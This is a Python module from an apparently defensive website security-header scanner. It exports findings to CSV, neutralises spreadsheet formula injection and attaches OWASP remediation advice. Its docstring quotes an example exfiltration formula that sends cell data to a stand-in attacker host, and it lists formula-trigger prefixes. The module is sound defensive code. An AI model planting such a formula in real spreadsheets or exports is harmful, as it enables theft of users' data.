"""
report_generator.py — Converts scan results into exportable reports.

Responsibility
--------------
Takes the unified scan result dict produced by scanner.scan_url() and
turns it into:

  • findings_to_dataframe(findings)    – pandas DataFrame for dashboard use
  • findings_to_csv_bytes(scan_result) – in-memory CSV bytes for download
  • findings_to_csv(findings, filepath)– write CSV to disk (utility)

This module has NO knowledge of HTTP, security rules, or Streamlit widgets.
It only transforms already-computed data into output formats.

Formula-injection safety
------------------------
Spreadsheet applications (Excel, LibreOffice Calc, Google Sheets) treat
cells that begin with =, +, -, @, \\t, or \\r as formula directives.  An
attacker who controls a header value (e.g. a malicious Server header or
a crafted CSP value) could embed a payload such as:

    =IMPORTDATA("https://attacker.com/?data="&A1)

When the CSV is opened, the spreadsheet executes it.  This is a well-known
CSV injection / formula injection attack (CWE-1236).

Mitigation applied here: sanitise_cell() prepends a single-quote (') before
any cell value that starts with one of the dangerous characters.  The quote
is visible in the raw CSV but suppressed by most spreadsheet applications
when displaying the cell, effectively neutralising the formula while keeping
the original value readable.

Remediation guidance
--------------------
REMEDIATION_GUIDANCE maps each check_name to structured OWASP-based advice.
Sources:
  • OWASP Secure Headers Project — https://owasp.org/www-project-secure-headers/
  • OWASP HTTP Security Response Headers Cheat Sheet
  • MDN Web Docs header references

Important: remediation guidance is informational.  Header policies can affect
website functionality (e.g. a strict CSP that blocks your own scripts, or
an HSTS policy that locks out HTTP-only staging environments).  Always test
header changes in a non-production environment before deploying.
"""

from __future__ import annotations

import csv
import io
from typing import Any

import pandas as pd


# ── CSV column order ───────────────────────────────────────────────────────────

CSV_COLUMNS = [
    "Target URL",
    "Scan Timestamp",
    "HTTP Status",
    "Check Name",
    "Status",
    "Severity",
    "Observed Value",
    "Explanation",
    "Recommendation",
    "Remediation Guidance (OWASP)",
]

# ── Formula-injection characters ──────────────────────────────────────────────

_INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


# ── OWASP-based remediation guidance per check ────────────────────────────────

REMEDIATION_GUIDANCE: dict[str, str] = {
    "HTTPS": (
        "Obtain a free TLS certificate from Let's Encrypt (https://letsencrypt.org). "
        "Configure your web server to redirect all HTTP requests to HTTPS with a "
        "301 Moved Permanently response. "
        "Reference: OWASP Transport Layer Security Cheat Sheet — "
        "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html. "
        "WARNING: Test the redirect in staging first — a misconfigured redirect "
        "or an HTTP-only resource can break the site for users."
    ),
    "Content-Security-Policy": (
        "Add a Content-Security-Policy response header. Start restrictively: "
        "\"Content-Security-Policy: default-src 'self'\" and relax only as required. "
        "Use nonces or hashes instead of 'unsafe-inline' for inline scripts. "
        "Deploy in report-only mode first (Content-Security-Policy-Report-Only) to "
        "identify breakage before enforcing. "
        "Reference: OWASP Content Security Policy Cheat Sheet — "
        "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html. "
        "WARNING: An overly strict CSP will block legitimate scripts and styles. "
        "Always validate in staging with real user flows before enforcing."
    ),
    "Strict-Transport-Security": (
        "Add the header on your HTTPS server only: "
        "\"Strict-Transport-Security: max-age=31536000; includeSubDomains\". "
        "Optionally add 'preload' and submit to https://hstspreload.org. "
        "Reference: OWASP HTTP Strict Transport Security Cheat Sheet — "
        "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html. "
        "WARNING: Once set with a long max-age the browser enforces HTTPS exclusively. "
        "Ensure HTTPS is fully working before setting max-age > 0. "
        "Do NOT set HSTS on HTTP responses or staging servers without HTTPS."
    ),
    "X-Content-Type-Options": (
        "Add: \"X-Content-Type-Options: nosniff\" to every response. "
        "Ensure all responses also include correct Content-Type headers. "
        "Reference: OWASP Secure Headers Project — "
        "https://owasp.org/www-project-secure-headers/#x-content-type-options. "
        "WARNING: This header is safe to add without functional side effects in "
        "virtually all cases, but verify that your server's Content-Type declarations "
        "are accurate before enforcing nosniff."
    ),
    "X-Frame-Options": (
        "Add: \"X-Frame-Options: DENY\" (or SAMEORIGIN if same-origin framing is "
        "intentional). Also consider the modern equivalent: "
        "\"Content-Security-Policy: frame-ancestors 'none'\". "
        "Reference: OWASP Clickjacking Defense Cheat Sheet — "
        "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html. "
        "WARNING: If your application legitimately embeds its own pages in iframes "
        "(e.g. widgets), use SAMEORIGIN rather than DENY."
    ),
    "Referrer-Policy": (
        "Add: \"Referrer-Policy: strict-origin-when-cross-origin\" (recommended) or "
        "\"no-referrer\" for maximum privacy. "
        "Reference: OWASP Secure Headers Project — "
        "https://owasp.org/www-project-secure-headers/#referrer-policy. "
        "WARNING: If your analytics or third-party integrations depend on the full "
        "Referer header, verify they still function after tightening this policy."
    ),
}

_GENERIC_GUIDANCE = (
    "Consult the OWASP Secure Headers Project for guidance: "
    "https://owasp.org/www-project-secure-headers/"
)


# ── Formula-injection sanitiser ───────────────────────────────────────────────

def sanitise_cell(value: Any) -> str:
    """
    Convert *value* to a string safe for use in a CSV cell.

    If the stringified value starts with a known spreadsheet formula prefix
    (=, +, -, @, TAB, CR), prepend a single-quote (') to neutralise it.
    This prevents CSV/formula injection (CWE-1236).

    The quote is part of the raw cell text.  Most spreadsheet applications
    display the remaining characters without the quote prefix, so the data
    remains human-readable.

    Parameters
    ----------
    value : Any
        Any value — will be str()-converted first.

    Returns
    -------
    str
        A safe string representation.

    Examples
    --------
    >>> sanitise_cell("=SUM(A1:A10)")
    "'=SUM(A1:A10)"
    >>> sanitise_cell("normal text")
    "normal text"
    >>> sanitise_cell(None)
    ""
    """
    if value is None:
        return ""
    text = str(value)
    if text.startswith(_INJECTION_PREFIXES):
        return "'" + text
    return text


# ── Core conversion functions ─────────────────────────────────────────────────

def findings_to_dataframe(findings: list[dict]) -> pd.DataFrame:
    """
    Convert a list of finding dicts into a pandas DataFrame.

    Parameters
    ----------
    findings : list[dict]
        Each dict must have the keys produced by security_rules.py:
        check_name, status, severity, observed_value, explanation,
        recommendation.

    Returns
    -------
    pd.DataFrame with columns matching CSV_COLUMNS (minus scan-level fields).
    """
    rows = []
    for f in findings:
        rows.append({
            "Check Name":    f.get("check_name", ""),
            "Status":        f.get("status", ""),
            "Severity":      f.get("severity", ""),
            "Observed Value": f.get("observed_value", ""),
            "Explanation":   f.get("explanation", ""),
            "Recommendation": f.get("recommendation", ""),
        })
    return pd.DataFrame(rows)


def findings_to_csv_bytes(scan_result: dict) -> bytes:
    """
    Build a complete CSV report from a scan result and return it as UTF-8
    bytes suitable for st.download_button(data=...).

    Every cell value is sanitised against formula injection before writing.

    Parameters
    ----------
    scan_result : dict
        The dict returned by scanner.scan_url().  Must have:
          • fetch_result   – dict with url, status_code, is_https,
                             scan_timestamp
          • security_findings – list[dict] of finding dicts

    Returns
    -------
    bytes
        UTF-8 encoded CSV content including a BOM so that Excel opens it
        correctly on all platforms.

    Raises
    ------
    ValueError
        If scan_result indicates a failed scan (no security_findings present).
    """
    findings = scan_result.get("security_findings")
    if not findings:
        raise ValueError(
            "Cannot generate a report: scan_result contains no security findings. "
            "Only generate reports from successful scans."
        )

    fetch = scan_result.get("fetch_result") or {}
    target_url  = sanitise_cell(fetch.get("url") or scan_result.get("url", ""))
    timestamp   = sanitise_cell(fetch.get("scan_timestamp") or scan_result.get("scan_timestamp", ""))
    http_status = sanitise_cell(fetch.get("status_code", ""))
    is_https    = "Yes" if fetch.get("is_https") else "No"

    buf = io.StringIO()
    writer = csv.writer(buf, quoting=csv.QUOTE_ALL, lineterminator="\r\n")

    # Header row
    writer.writerow(CSV_COLUMNS)

    for finding in findings:
        check_name  = finding.get("check_name", "")
        guidance    = REMEDIATION_GUIDANCE.get(check_name, _GENERIC_GUIDANCE)
        writer.writerow([
            target_url,
            timestamp,
            http_status,
            sanitise_cell(check_name),
            sanitise_cell(finding.get("status", "")),
            sanitise_cell(finding.get("severity", "")),
            sanitise_cell(finding.get("observed_value", "")),
            sanitise_cell(finding.get("explanation", "")),
            sanitise_cell(finding.get("recommendation", "")),
            sanitise_cell(guidance),
        ])

    # UTF-8 BOM ensures Excel opens the file with correct encoding on Windows
    return "\ufeff".encode("utf-8") + buf.getvalue().encode("utf-8")


def findings_to_csv(findings: list[dict], filepath: str) -> None:
    """
    Write findings to a CSV file at *filepath*.

    This is a utility function for command-line or scripted use.
    For in-browser downloads, use findings_to_csv_bytes() instead.

    Parameters
    ----------
    findings : list[dict]
        Finding dicts from run_all_rules().
    filepath : str
        Destination path, e.g. "reports/scan_2024-01-01.csv".
    """
    df = findings_to_dataframe(findings)
    # Apply sanitisation to every string cell
    for col in df.columns:
        df[col] = df[col].apply(sanitise_cell)
    df.to_csv(filepath, index=False, encoding="utf-8-sig")
